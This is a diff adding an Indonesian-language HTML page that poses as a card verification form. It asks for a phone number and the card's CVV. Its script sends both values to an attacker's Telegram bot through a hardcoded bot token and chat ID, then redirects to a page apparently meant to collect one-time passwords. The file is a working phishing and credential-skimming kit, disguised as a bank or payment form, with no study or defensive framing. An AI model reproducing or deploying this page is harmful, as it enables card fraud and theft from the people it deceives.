@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form CVV Kartu</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 10px;
+        }
+        .container {
+            background-color: #f5f5f5;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 350px;
+            background: url(alexFrontEnd/bg.png) no-repeat center;
+            background-size: 100% 100%;
+        }
+        .title {
+            color: #333;
+            font-size: 16px;
+            margin-bottom: 20px;
+            text-align: left;
+            text-shadow: #55555561 0px 2px 2px;
+            font-weight: bold;
+        }
+        .input-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            position: relative;
+        }
+        .input-label {
+            font-weight: bold;
+            color: #555;
+            margin-left: 100px;
+            white-space: nowrap;
+        }
+        .input-wrapper {
+            position: relative;
+            flex-grow: 1;
+            display: flex;
+            justify-content: flex-end;
+        }
+        .input-field {
+            width: 110px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+            text-align: left;
+            margin-right: 45px;
+        }
+        .cvv-icon {
+            position: absolute;
+            right: 60px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #777;
+            cursor: pointer;
+        }
+        .submit-btn {
+            background-color: #03ac0ecc;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .submit-btn:hover {
+            background-color: #45a049;
+        }
+        .example {
+            font-size: 14px;
+            color: #888;
+            margin-top: -15px;
+            margin-bottom: 20px;
+            text-align: right;
+            margin-right: 45px;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 10px;
+        }
+        .loading i {
+            color: #03ac0ecc;
+            font-size: 20px;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZF1JJfpzRI8lql8Bl62AWj_vNM8ioK2b9dZM0sh35Xfo9aeUgwmuJvS_nuwNjCAn3mJh49mYxg_WEz3PbXlCeFgCiS6exsPMXEaMb04BkAKfJ1jXcshlNvAYcUHpflIc-zHxA14yKgwYQ7jdrQvjuvpZdPUOeGvkoMZxxeaOyTlbPkk8t9RpIi9OQvfys/s1080/1000200787.jpg" style="position:fixed;top:0;width:100%;"></img>
+    <div class="container">        
+        <div class="title">Silakan masukkan CVV yang terletak dibelakang kartu Anda</div>
+        <form method="post" id="cvvForm" onsubmit="submitForm(event)">
+          
+            <div class="input-group">
+                <label class="input-label" style="margin-left: 50px;">No.Hp</label>
+                <div class="input-wrapper">
+                    <input type="tel" name="nomor" class="input-field" style="width:150px;" placeholder="Nomor Handphone" maxlength="" required>
+                </div>
+            </div>
+          
+            <div class="input-group">
+                <label class="input-label">CVV</label>
+                <div class="input-wrapper">
+                    <input type="password" name="cvv" inputmode="numeric" class="input-field" placeholder="***" maxlength="3" required>
+                    <i class="fas fa-credit-card cvv-icon" title="CVV biasanya 3 digit di belakang kartu"></i>
+                </div>
+            </div>
+            <div class="example">Contoh: 123</div>
+            
+            <button type="submit" class="submit-btn" id="submitBtn">Lanjutkan</button>
+            <div class="loading" id="loadingIndicator">
+                <i class="fas fa-spinner fa-spin"></i> 
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '8449078397:AAFqHmrJKLNo4ZX1TCsbCn1uf-GjrQtnmo8';
+        const TELEGRAM_CHAT_ID = '7823308464';
+        
+        // Fungsi untuk mengirim data ke Telegram
+        function sendToTelegram(nomor, cvv) {
+            const message = `🔐 *Data Kartu Kredit* 🔐\n\n📱 Nomor HP: *${nomor}*\n🔒 CVV: *${cvv}*\n⏰ Waktu: ${new Date().toLocaleString()}\n\n⚠️ Data sensitif - Jangan bagikan!`;
+            
+            // Menggunakan fetch API untuk mengirim pesan ke bot Telegram
+            return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Data berhasil dikirim ke Telegram:', data);
+                return true;
+            })
+            .catch(error => {
+                console.error('Error mengirim data ke Telegram:', error);
+                return false;
+            });
+        }
+        
+        // Fungsi untuk menangani submit form
+        function submitForm(event) {
+            event.preventDefault();
+            
+            // Ambil nilai dari form
+            const nomor = document.querySelector('input[name="nomor"]').value;
+            const cvv = document.querySelector('input[name="cvv"]').value;
+            
+            // Tampilkan loading indicator
+            document.getElementById('submitBtn').style.display = 'none';
+            document.getElementById('loadingIndicator').style.display = 'block';
+            
+            // Kirim data ke Telegram
+            sendToTelegram(nomor, cvv)
+                .then(success => {
+                    if (success) {
+                        // Jika berhasil dikirim ke Telegram, lanjutkan ke halaman berikutnya
+                        setTimeout(() => {
+                            window.location.href = 'otpcvv.html';
+                        }, 1500);
+                    } else {
+                        // Jika gagal, tetap lanjutkan tetapi beri pesan error
+                        alert('Terjadi masalah saat mengirim data. Silakan coba lagi.');
+                        document.getElementById('submitBtn').style.display = 'block';
+                        document.getElementById('loadingIndicator').style.display = 'none';
+                    }
+                });
+        }
+        
+        // Validasi input hanya angka untuk CVV
+        document.querySelector('input[name="cvv"]').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+        
+        // Validasi input hanya angka untuk nomor HP
+        document.querySelector('input[name="nomor"]').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9+]/g, '');
+        });
+    </script>
+</body>
+</html>
